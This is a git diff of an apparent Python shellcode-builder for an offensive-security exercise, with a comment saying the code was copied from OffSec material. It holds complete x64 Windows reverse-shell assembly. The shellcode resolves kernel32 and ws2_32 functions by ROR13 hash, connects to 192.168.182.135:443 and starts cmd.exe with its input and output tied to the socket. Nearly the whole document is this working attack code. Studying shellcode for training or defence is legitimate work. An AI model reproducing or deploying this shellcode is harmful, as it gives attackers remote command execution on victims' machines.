@@ -13,6 +13,11 @@ typedef struct _UNICODE_STRING {
 } UNICODE_STRING;
 
 
+2320_1247:
+deleted my template, didnt work, too many changes
+copied code from offsec
+a few changes were needed, added in the comments
+
 
 
 """
@@ -41,329 +46,214 @@ from modules.rorHash_module import hashFuncName
 def ret_asm() -> str:
 
     asm = f"""
-    START:
-        int3                                        ; Remove when not debugging  
+    start:
+        mov rbp, rsp 				; Set our base pointer to the current stack pointer
+        sub rsp, 0x610              ; Allocate 0x610 bytes on the stack for our code's use
     
-    SETUP_STACK:
-        mov rbp, rsp                                ; Initialize stack frame
-        sub rsp, 0x610                              ; Allocate 1552 bytes of local stack space
-    
-    FIND_KERNEL32:
-        xor rcx, rcx                                ; rcx = 0
-        mov rcx, 60h                                ; rcx = 0x60
-        mov r8, gs:[rcx]                            ; r8 = PEB (Process Environment Block)
-        mov r8, [r8 + 0x18]                         ; r8 = PEB_LDR_DATA (loader data structure)
-        mov r8, [r8 + 0x30]                         ; r8 = InInitializationOrderModuleList (first module entry)
+    ; ==================================================================================
+    ; =================== - Locate KERNEL32 & store address in RDI - ===================
+    ; ==================================================================================
+	
+    FIND_KERNELBASE:
+        mov rcx, 60h				; RCX = 0x60
+        mov r8, gs:[rcx]			; R8 = ptr to PEB ([GS:0x60])
+        mov rdi, [r8 + 18h]			; RDI = PEB->Ldr
+        mov rdi, [rdi + 30h]		; RDI = PEB->Ldr->InLoadInitOrder
+        xor rcx, rcx 				; RCX = 0
+        mov dl, 4bh					; DL = "K"
 
-    CHECK_NEXT_MODULE:
-        mov rbx, [r8 + 0x30]                        ; rbx = base address of current module
-        mov rdi, [r8 + 0x50]                        ; rdi = pointer to module name (wide string)
-        mov r8, [r8]                                ; r8 = next module in linked list (FLINK)
-        cmp byte [rdi], 0x6b                        ; Check if first char is 'k' (0x6b)
-        jne CHECK_NEXT_MODULE                       ; If not kernel32, loop to next module
-        cmp [rdi + 12*2], cx                        ; Check for null terminator at offset 24 (12th wide char)
-        jne CHECK_NEXT_MODULE                       ; If not kernel32, loop to next module
+	NEXT_MODULE:				
+        mov rax, [rdi+10h]			; RAX = InInitOrder[X].base_address
+        mov rsi, [rdi+40h]			; RSI = InInitOrder[X].module_name
+        mov rdi, [rdi]				; RDI = InInitOrder[X].flink (next)
+        cmp [rsi+12*2], cx 			; (unicode) modulename[12] == 0x00 ?
+        jne NEXT_MODULE 			; No: try next module
+        cmp [rsi], dl 				; modulename starts with "K"
+        jne NEXT_MODULE 			; No: try next module
+        jmp LOCATE_FUNCS 			; Skip to main shellcode
 
+    ; ==================================================================================
+    ; ============ - Function to go through EDT & return function address - ============
+    ; ==================================================================================
 
-    FIND_FUNCTION_SHORTEN:
-        jmp FIND_FUNCTION_SHORTEN_BNC               ; Skip over the actual function code
-    
-    FIND_FUNCTION_RET:
-        pop rsi                                     ; Pop return address from call
-        mov [rbp + 0x04], rsi                       ; Store function address pointer on stack
-        jmp RESOLVE_SYMBOLS_TERMINATEPROCESS        ; Jump to resolve kernel32 symbols
+	LOOKUP_FUNC: 
+        mov ebx, [rdi + 3ch]		; Offset to PE Signature VMA
+        add rbx, 88h 				; Export table relative offset 
+        add rbx, rdi 				; Export table VMA
+        mov eax, [rbx] 				; Export directory relative offset
+        mov rbx, rdi 				
+        add rbx, rax 				; Export directory VMA
+        mov eax, [rbx + 20h] 		; AddressOfNames relative offset
+        mov r8, rdi 				
+        add r8, rax 				; AddressOfNAmes VMA
+        mov ecx, [rbx + 18h] 		; NumberOfNames
 
-    FIND_FUNCTION_SHORTEN_BNC:
-        call FIND_FUNCTION_RET                      ; Call to set up function pointer, placed here to generate negative offset
+	CHECK_NAMES:
+        jecxz FOUND_FUNC                ; Jump to the end if ecx is 0
+        dec   ecx                       ; Decrement our names counter
+        mov   eax, [r8 + rcx * 4]       ; Store the relative offset of the name
+        mov   rsi, rdi                  ; 
+        add   rsi, rax                  ; Set RSI to the VMA of the current name
+        xor r9, r9 					; R9 = 0
+        xor rax, rax 				; RAX = 0
+        cld 						; Clear direction
 
+	CALC_HASH: 	
+        lodsb 						; Load the next byte from RSI into AL
+        test al, al 				; Test ourselves
+        jz CALC_FINISHED 			; If the ZF is set,we've hit the null term
+        ror r9d, 0dh 				; Rotate R9D 13 bits to the right
+        add r9, rax 				; Add the new byte to the accumulator
+        jmp CALC_HASH 				; Next iteration
 
-    ; ===== FIND_FUNCTION: Resolves function addresses via Export Address Table (EAT) =====
-    FIND_FUNCTION:
-        push rax                                    ; Save general purpose registers
-        push rbx
-        push rcx
-        push rdx
-        push rsi
-        push rdi
-        push rbp
-        mov rax, [rbx + 0x3C]                       ; rax = offset to IMAGE_NT_HEADERS (PE signature location)
-        mov rdi, [rbx + rax + 0x78]                 ; rdi = Export Table RVA (relative virtual address)
-        add rdi, rbx                                ; rdi = Export Table VMA (absolute virtual memory address)
-        mov rcx, [rdi + 0x18]                       ; rcx = number of exported functions
-        mov rax, [rdi + 0x20]                       ; rax = AddressOfNames RVA (pointer table RVA)
-        add rax, rbx                                ; rax = AddressOfNames VMA
-        mov [rbp - 4], rax                          ; Store on stack for later use in loop
+	CALC_FINISHED: 				 
+        cmp r9d, edx 				; Compare the computed hash with the requested hash
+        jnz CHECK_NAMES 			; No match, try the next one
 
-    SEARCH_LOOP:
-        jrcxz FIND_FUNCTION_DONE                    ; If rcx is 0, all functions checked, exit
-        dec rcx                                     ; rcx-- (decrement function counter)
-        mov rax, [rbp - 4]                          ; rax = AddressOfNames VMA
-        mov rsi, [rax + rcx*4]                      ; rsi = function name RVA (4 bytes per entry)
-        add rsi, rbx                                ; rsi = function name VMA (string location)
+	FIND_ADDR: 				
+        mov r8d, [rbx + 24h] 		; Ordinals table relative offset
+        add r8, rdi 				; Ordinals table VMA
+        xor rax, rax 				; RAX = 0
+        mov ax, [r8 + rcx * 2] 		; Extrapolate the function's ordinal
+        mov r8d, [rbx + 1ch] 		; Address table relative offset
+        add r8, rdi 				; Address table VMA
+        mov eax, [r8 + rax * 4] 	; Extract the relative function offset from its ordinal
+        add rax, rdi 				; Function VMA
 
-    COMPUTE_HASH:
-        xor rax, rax                                ; rax = 0 (hash accumulator)
-        cqo                                         ; rdx = 0 (extend rax sign to rdx)
-        cld                                         ; Clear direction flag (ensures LODSB increments rsi)
+	FOUND_FUNC: 				
+        ret 					
 
-    HASH_LOOP:
-        lodsb                                       ; AL = byte at [rsi], rsi++ (load function name byte)
-        test al, al                                 ; Check if AL is null terminator (end of string)
-        jz HASH_DONE                                ; If null byte found, hash computation complete
-        ror rdx, 0xd                                ; rdx = rdx rotated right 13 bits (ROR hash)
-        add rdx, rax                                ; rdx += AL (accumulate hash)
-        jmp HASH_LOOP                               ; Continue hashing next byte
-    HASH_DONE:
+	LOCATE_FUNCS: 				
+        mov rdi, rax 				; Store moduleBase
+        sub rsp, 8
+        mov r15, rsp 				; Stack pointer for storage
 
-    COMPARE_HASH_TO_FUNCTION:
-        cmp rdx, [rsp + 0x40]                       ; Compare computed hash (rdx) with target hash (passed on stack)
-        jnz SEARCH_LOOP                             ; If hashes don't match, check next function
-        mov rdx, [rdi + 0x24]                       ; rdx = AddressOfNameOrdinals RVA
-        add rdx, rbx                                ; rdx = AddressOfNameOrdinals VMA
-        mov cx, [rdx + rcx*2]                       ; CX = ordinal (2 bytes per entry)
-        mov rdx, [rdi + 0x1C]                       ; rdx = AddressOfFunctions RVA
-        add rdx, rbx                                ; rdx = AddressOfFunctions VMA
-        mov rax, [rdx + rcx*4]                      ; rax = function RVA (4 bytes per entry)
-        add rax, rbx                                ; rax = function VMA (absolute address)
-        mov [rsp], rax                              ; Store function address on stack for pop restore
-    
-    FIND_FUNCTION_DONE:
-        pop rbp                                     ; Restore general purpose registers
-        pop rdi
-        pop rsi
-        pop rdx
-        pop rcx
-        pop rbx
-        pop rax
-        ret                                         ; Return to caller
+	LOCATE_LOADLIBRARYA:
+        mov edx, {hashFuncName("LoadLibraryA")}	; Hash of "LoadLibraryA"
+        call LOOKUP_FUNC
+        mov [r15+80h], rax
 
-    ; ===== RESOLVE_SYMBOLS_KERNEL32: Push RoR hashes of Functions to load from kernel32.dll =====
-    RESOLVE_SYMBOLS_TERMINATEPROCESS:
-        mov edi, {hashFuncName("TerminateProcess")}
-        push rdi
-        call [rbp + 0x04]                           ; Call FIND_FUNCTION to resolve address
-        mov [rbp + 0x10], rax                       ; Store TerminateProcess address in [rbp+0x10]
-    
-    RESOLVE_SYMBOLS_LOADLIBRARYA:
-        mov edi, {hashFuncName("LoadLibraryA")}
-        push rdi
-        call [rbp + 0x04]                           ; Call FIND_FUNCTION to resolve address
-        mov [rbp + 0x14], rax                       ; Store LoadLibraryA address in [rbp+0x14]
-    
-    RESOLVE_SYMBOLS_CREATEPROCESSA:
-        mov edi, {hashFuncName("CreateProcessA")}
-        push rdi
-        call [rbp + 0x04]                           ; Call FIND_FUNCTION to resolve address
-        mov [rbp + 0x18], rax                       ; Store CreateProcessA address in [rbp+0x18]
-    
-    ; ===== LOAD_WS2_32: Load string to the stack in little endian (\x77\x73\x32\x5f \x33\x32\x2e\x64 \x6c\x6c)  =====
-    LOAD_WS2_32:
-        xor rax, rax                                ; rax = 0
-        mov ax, 0x6c6c                              ; AX = 'll' (part of "ws2_32.dll")
-        push rax                                    ; Push 'll\0\0'
-        push 0x642e3233                             ; Push 'd.23'
-        push 0x5f327377                             ; Push '_2sw' 
-        push rsp                                    ; Push pointer to "ws2_32.dll" string
-        call [rbp + 0x14]                           ; Call LoadLibraryA("ws2_32.dll") 
+    LOCATE_CREATEPROCESSA:
+        mov edx, {hashFuncName("CreateProcessA")}
+        call LOOKUP_FUNC 			
+        int3
+        mov [r15+88h], rax 	
 
-    ; ===== RESOLVE_SYMBOLS_WS2_32: Push RoR hashes of Functions to load from ws2_32.dll =====
-    RESOLVE_SYMBOLS_WSASTARTUP:
-        mov rbx, rax                                ; rbx = base address of ws2_32.dll
-        mov edi, {hashFuncName("WSAStartup")}
-        push rdi
-        call [rbp + 0x04]                           ; Call FIND_FUNCTION to resolve address
-        mov [rbp + 0x1C], rax                       ; Store WSAStartup address in [rbp+0x1C]
+    LOCATE_TERMINATEPROCESS:
+        mov edx, {hashFuncName("TerminateProcess")}
+        call LOOKUP_FUNC
+        mov [r15+90h], rax
 
-    RESOLVE_SYMBOLS_WSASOCKETA:
-        mov edi, {hashFuncName("WSASocketA")}
-        push rdi
-        call [rbp + 0x04]                           ; Call FIND_FUNCTION to resolve address
-        mov [rbp + 0x20], rax                       ; Store WSASocketA address in [rbp+0x20]
-    
-    RESOLVE_SYMBOLS_WSACONNECT:
-        mov edi, {hashFuncName("WSAConnect")}
-        push rdi
-        call [rbp + 0x04]                           ; Call FIND_FUNCTION to resolve address
-        mov [rbp + 0x24], rax                       ; Store WSASConnect address in [rbp+0x24]
-
-    
-    ; ===== CALL_WSASTARTUP: Setup args and call WSAStartup =====
-    CALL_WSASTARTUP:
-        mov rax, rsp                                ; rax = rsp
-        mov cx, 0x590                               ; CX = 0x590
-        sub rax, rcx                               ; rax -= rcx to avoid overwriting stack
-        push rax                                    ; Push pointer to WSADATA structure
-        xor rax, rax                                ; rax = 0
-        call [rbp + 0x1C]                           ; Call WSAStartup(MAKEWORD(2,2), &WSADATA)
-
-    ; ===== CALL_WSASOCKETA: Setup args and call WSASocketA =====
-    ; WSASocketA(AF, Type, Protocol, lpProtocolInfo, g, dwFlags)
-    ; AF = 2 (AF_INET)
-    ; Type = 1 (SOCK_STREAM)
-    ; Protocol = 6 (IPPROTO_TCP)
-    ; lpProtocolInfo = NULL <- Requires a pointer to WSAPROTOCOL_INFO struct, not needed here
-    ; g = NULL <- Pointer to group id, not needed here
-    ; dwFlags = 0 <- No special flags, can be [e.g., WSA_FLAG_OVERLAPPED]
-
-
-    CALL_WSASOCKETA:
-        xor rax, rax                                ; rax = 0
-        push rax                                    ; Push dwFlags = 0
-        push rax                                    ; Push g = 0
-        push rax                                    ; Push lpProtocolInfo = 0
-        mov al, 0x06                                ; rax = 6 (AL, IPPROTO_TCP)
-        push rax                                    ; Push Protocol
-        sub al, 0x05                                ; rax = 1 (Type)
-        push rax                                    ; Push Type
-        inc rax                                     ; rax = 2 (AF)
-        push rax                                    ; Push AF
-        call [rbp + 0x20]                           ; Call WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_IP, 0, 0, 0)
-
-
-    ; ===== CALL_WSACONNECT: Setup args and call WSAConnect =====
-    ; WSAConnect(s, *name, namelen, lpCallerData, lpCalleeData, lpSQOS, lpGQOS)
-    ; lpCallerData, lpCalleeData, lpSQOS, lpGQOS = NULL <- REASON:: Legacy|NotUsed
-    ; *name = pointer to sockaddr structure
-    ; UCHAR s_b1;
-    ; UCHAR s_b2;
-    ; UCHAR s_b3;
-    ; UCHAR s_b4;
-    ; USHORT s_w1;
-    ; USHORT s_w2;
-    ; ULONG S_addr;
-
-    CALL_WSACONNECT:
-        mov rsi, rax                                ; rsi SOCKET DESCRIPTOR
-        xor rax, rax                                ; rax = 0
-        push rax                                    ; Push sin_zero[]
-        push rax                                    ; Push sin_zero[]
-
-        ; PUSH IP AND PORT
-        mov edi, {hexIP("192.168.18.52")}
-        push rdi
-        mov ax, {hexPort(443)}                  
+    ; ==================================================================================
+    ; ==================== - Locate WS2_32 & store address in RDI - ====================
+    ; ==================================================================================
+	
         
-        shl rax,0x10                                ; Left shift PORT to high word
-        add ax, 0x02                                ; AF_INET (sin_family)
-        push rax                                    ; Push sin_family and sin_port
-        push rsp                                    ; Push pointer to sockaddr_in structure
-        pop rdi                                     ; rdi = pointer to sockaddr_in
-        xor rax, rax                                ; rax = 0
-        push rax                                    ; Push lpGQOS
-        push rax                                    ; Push lpSQOS
-        push rax                                    ; Push lpCallerData
-        push rax                                    ; Push lpCalleeData
-        add al, 0x10                                ; rax = 16 (size of sockaddr_in)
-        push rax                                    ; Push iSockaddrLength
-        push rdi                                    ; Push lpSockaddr
-        push rsi                                    ; Push s (socket descriptor)
-        call [rbp + 0x24]                           ; Call WSAConnect
+	CALL_LOADLIBRARYA:
+        mov rcx, 642e32335f327377h      ; "ws2_32.d" in hex(reversed)
+        mov [r15+100h], rcx
+        mov rcx, 6c6ch                  ; "ll" in hex(reversed)
+        mov [r15+108h], rcx
+        lea rcx, [r15+100h]
+        mov rax, [r15+80h]
+        call rax
+        mov rdi, rax
 
-    ; ===== CREATE_PROCESS: Setup args and call CreateProcessA to spawn cmd.exe =====
-    ; CreateProcessA(lpApplicationName, lpCommandLine, lpProcessAttributes, lpThreadAttributes, bInheritHandles
-    ;                dwCreationFlags, lpEnvironment, lpCurrentDirectory, lpStartupInfo, lpProcessInformation)
-    ; lpApplicationName = cmd.exe
-    ; lpCommandLine = NULL <- can be NULL to use application name
-    ; lpProcessAttributes = NULL <- default security, defines inheritance
-    ; lpThreadAttributes = NULL <- default security, defines inheritance + ACL
-    ; bInheritHandles = TRUE <- inherit handles from parent process
-    ; dwCreationFlags = 0 <- default behavior
-    ; lpEnvironment = NULL <- use parent process environment
-    ; lpCurrentDirectory = NULL <- use parent process current directory
-    ; lpStartupInfo = pointer to STARTUPINFO struct
-    ; lpProcessInformation = pointer to PROCESS_INFORMATION struct
+	LOCATE_WSASTARTUP:
+        mov edx, {hashFuncName("WSAStartup")}
+        call LOOKUP_FUNC
+        mov [r15+98h], rax
 
-    ; struct STARTUPINFO [
-    ;     DWORD   cb;                   ; Size of the structure in bytes. Default: sizeof(STARTUPINFO) = 0x44
-    ;     LPSTR   lpReserved;           ; Reserved, must be NULL
-    ;     LPSTR   lpDesktop;            ; Desktop name, set to NULL
-    ;     LPSTR   lpTitle;              ; Title for the new process window, set to NULL
-    ;     DWORD   dwX;                  ; X position of the window, set to NULL
-    ;     DWORD   dwY;                  ; Y position of the window, set to NULL
-    ;     DWORD   dwXSize;              ; Width of the window, set to NULL
-    ;     DWORD   dwYSize;              ; Height of the window, set to NULL
-    ;     DWORD   dwXCountChars;        ; Screen buffer width, set to NULL
-    ;     DWORD   dwYCountChars;        ; Screen buffer height, set to NULL
-    ;     DWORD   dwFillAttribute;      ; Screen buffer fill attribute, set to NULL
-    ;     DWORD   dwFlags;              ; Startup options, set to STARTF_USESTDHANDLES(0x100), needed to rrdirect std handles    
-    ;     WORD    wShowWindow;          ; Window show state, must be NULL to disable cmd window  
-    ;     WORD    cbReserved2;          ; Reserved, must be NULL
-    ;     LPBYTE  lpReserved2;          ; Reserved, must be NULL
-    ;     HANDLE  hStdInput;            ; Standard input handle
-    ;     HANDLE  hStdOutput;           ; Standard output handle
-    ;     HANDLE  hStdError;            ; Standard error handle
-    ; ]
-    ; For cmd.exe, cb = 0x44, dwFlags = 0x100, rest are all null
+	LOCATE_WSASOCKETA:
+        mov edx, {hashFuncName("WSASocketA")}		
+        call LOOKUP_FUNC
+        mov [r15+0a0h], rax
+
+	LOCATE_CONNECT:
+        mov edx, {hashFuncName("connect")}
+        call LOOKUP_FUNC
+        mov [r15+0a8h], rax
     
-    CREATE_STARTUPINFOA:
-        push rsi                        ; Push hSTDError, rsi currently holds socketDescriptor
-        push rsi                        ; Push hSTDOutput
-        push rsi                        ; Push hSTDInput
-        xor rax, rax                    ; rax = 0
-        push rax                        ; Push lpReserved2
-        push rax                        ; Push cbReserved2 + wShowWindow
-        xor rcx, rcx                    ; rcx = 0
-        mov al, 0x80                    ; rax = 0x80
-        mov cx, 0x80                    ; CX =  0x80 
-        add rax, rcx                    ; rax = 0x100 (dwFlags = STARTF_USESTDHANDLES)
-        push rax                        ; Push dwFlags
-        xor rax, rax                    ; rax = 0
-        push rax                        ; Push dwFillAttribute
-        push rax                        ; Push dwYCountChars
-        push rax                        ; Push dwXCountChars
-        push rax                        ; Push dwYSize
-        push rax                        ; Push dwXSize
-        push rax                        ; Push dwY
-        push rax                        ; Push dwX
-        push rax                        ; Push lpTitle
-        push rax                        ; Push lpDesktop
-        push rax                        ; Push lpReserved
-        mov rax, 0x44                   ; rax = 0x44 (size of STARTUPINFO)
-        push rax                        ; Push cb
-        push rsp                        ; Push pointer to STARTUPINFO structure
-        pop rdi                         ; rdi = pointer to STARTUPINFO
 
-    ;cmd.exe string creation
-    CREATE_CMD_STR:
-        mov rax, 0xFF9A879B                 ; rax = 'exe.'
-        neg rax
-        push rax                            ; Push 'exe.'
-        mov rax, 0x2e646d63                 ; rax = 'cmd.'
-        push rax                            ; Push 'cmd.'
-        push rsp                            ; Push pointer to "cmd.exe" string
-        pop rbx                             ; rbx = pointer to "cmd.exe"
+	CALL_WSASTARTUP:
+        mov rcx, 202h
+        lea rdx, [r15+200h]
+        mov rax, [r15+98h]
+        call rax
 
-    ; everything is ready, call createProcessA
+	CALL_WSASOCKETA:
+        mov ecx, 2
+        mov edx, 1
+        mov r8, 6
+        xor r9, r9
+        mov [rsp+20h], r9
+        mov [rsp+28h], r9
+        mov rax, [r15+0a0h]
+        call rax
+        mov rsi, rax
+
+	CALL_CONNECT:
+        mov rcx, rax
+        mov r8, 10h
+        lea rdx, [r15+220h]
+        mov r9, 0x{hexIP("192.168.182.135")[2:]}{hexPort(443)[2:]}0002 ; fix with correct IP
+        mov [rdx], r9
+        xor r9, r9
+        mov [rdx+8], r9
+        mov rax, [r15+0a8h]
+        call rax
+
+
+    ; ==================================================================================
+    ; ======================= - Setup Args for CreateProcessA - ========================
+    ; ==================================================================================
+    
+    
+	SETUP_SI_AND_PI:
+        mov rdi, r15                ; lpProcessInformation and lpStartupInfo 
+        add rdi, 300h               ;
+        mov rbx, rdi                ;
+        xor eax, eax                ;
+        mov ecx, 20h                ;
+        rep stosd                   ; Zero 0x80 bytes
+        mov eax, 68h                ; lpStartupInfo.cb = sizeof(lpStartupInfo)
+        mov [rbx], eax              ;
+        mov eax, 100h				; STARTF_USESTDHANDLES
+        mov [rbx+3ch], eax 			; lpStartupInfo.dwFlags
+        mov [rbx+50h], rsi 			; lpStartupInfo.hStdInput = socket handle
+        mov [rbx+58h], rsi 			; lpStartupInfo.hStdOutput = socket handle
+        mov [rbx+60h], rsi 			; lpStartupInfo.hStdError = socket handle
+    
     CALL_CREATEPROCESSA:
-        mov rax, rsp                    ; rax = rsp
-        xor rcx, rcx                    ; rcx = 0
-        mov cx, 0x390                   ; CX = 0x390
-        sub rax, rcx                    ; rax -= rcx to avoid overwriting stack later
-        push rax                        ; Push pointer to PROCESS_INFORMATION structure
-        push rdi                        ; Push pointer to STARTUPINFO structure
-        xor rax, rax                    ; rax = 0
-        push rax                        ; Push lpCurrentDirectory = NULL
-        push rax                        ; Push lpEnvironment = NULL
-        push rax                        ; Push dwCreationFlags = 0
-        inc rax                         ; rax = 1
-        push rax                        ; Push bInheritHandles = TRUE
-        dec rax                         ; rax = 0
-        push rax                        ; Push lpThreadAttributes = NULL
-        push rax                        ; Push lpProcessAttributes = NULL
-        push rbx                        ; Push pointer to "cmd.exe" string
-        push rax                        ; Push lpApplicationName = NULL
-        call [rbp + 0x18]               ; Call CreateProcessA("cmd.exe", NULL, NULL, NULL, TRUE, 0, NULL, NULL, &STARTUPINFO, &PROCESS_INFORMATION)
-        
+        xor ecx, ecx                ; lpApplicationName
+        mov rdx, r15                ; lpCommandLine
+        add rdx, 180h               ;
+        mov eax, 646d63h 			      ; "cmd"
+        mov [rdx], rax 
+        xor r8, r8                  ; lpProcessAttributes
+        xor r9, r9                  ; lpThreadAttributes
+        xor eax, eax                ;
+        inc eax 
+        mov [rsp + 20h], rax        ; bInheritHandles
+        dec eax
+        mov [rsp + 28h], rax        ; dwCreationFlags
+        mov [rsp + 30h], rax        ; lpEnvironment
+        mov [rsp + 38h], rax        ; lpCurrentDirectory
+        mov [rsp + 40h], rbx        ; lpStartupInfo
+        add rbx, 68h                ;
+        mov [rsp + 48h], rbx        ; lpProcessInformation
+        mov rax, [r15+88h]
+        int3
+        call rax
 
-
-        
-    ; ===== EXIT_PROCESS: With everything ready in the stack we can proceed w our func calls here =====
-    EXIT_PROCESS:
-        xor rcx, rcx                                ; rcx = 0
-        push rcx                                    ; Push 0 as exit code parameter
-        push 0xFFFFFFFF                             ; Push -1 (current process handle constant)
-        call [rbp+0x10]                             ; Call TerminateProcess(hProcess=-1, uExitCode=0)
-
+    CALL_TERMINATEPROCESS:
+        mov edx, {hashFuncName("TerminateProcess")}
+        call LOOKUP_FUNC
+        xor rcx, rcx
+        dec rcx 					; Process handle
+        xor rdx, rdx 				; Zero RDX == Exit Reason
+        mov rax, [r15+90h]
+        call rax					; TerminateProcess
     """
 
     return asm
@@ -375,7 +265,14 @@ def get_shellcode():
 
     shellcode = b""
     # shellcode += keystone_asm(CODE=asm, debug=True)
-    shellcode += nasm_asm(CODE=asm, arch=64, print=True, inject_fixes=True, hex_split="db")
+    shellcode += nasm_asm(
+        CODE=asm,
+        arch=64,
+        print=True,
+        inject_fixes=True,
+        # hex_split="db",
+        build_exe=False,
+    )
 
     # keystone_asm returns bytes, so we can return it as a bytesarray
     shellcode = bytearray(shellcode)
